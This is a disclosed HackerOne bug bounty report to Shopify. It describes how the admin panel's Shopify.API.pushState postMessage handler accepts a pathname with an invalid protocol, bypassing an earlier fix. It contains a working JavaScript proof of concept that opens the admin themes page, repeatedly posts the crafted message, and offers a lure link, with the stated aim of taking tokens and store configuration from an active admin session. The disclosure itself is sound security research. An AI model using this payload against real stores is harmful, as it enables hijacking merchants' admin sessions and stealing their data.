# Inject page in admin panel via Shopify.API.pushState with protocol invalid

## Report Details
- **Report ID**: 868615
- **URL**: https://hackerone.com/reports/868615
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-05-08T00:36:48.273Z
- **Disclosed**: 2020-12-27T22:14:40.193Z

## Reporter
- **Username**: tiago-danin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
# Disclose Token in reports
## Summary
Some time, i found a bug the #662083.
Today I found a new payload, invalid protocol are not tested correctly in filter method.

## Step to Reproduce
See the steps in #662083, but with payload of step 02 replace to:

```javascript
<script>
function attack(){
    const ctx = window.open(location.origin+'/admin/themes', '_blank')
    const data = JSON.stringify({
        message: 'Shopify.API.pushState',
        data: {pathname: "invalid:pages/xss"}
    });

    let interval;
    interval = setInterval(function(){
        if (window.attackSuccess) {
            clearInterval(interval)
        } else {
            ctx.postMessage(data)
        }
    }, 500)
}
attack()
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## Impact

Abuse the active admin session to extract data as:

Get tokens.
Store config.

## Attachments
No attachments
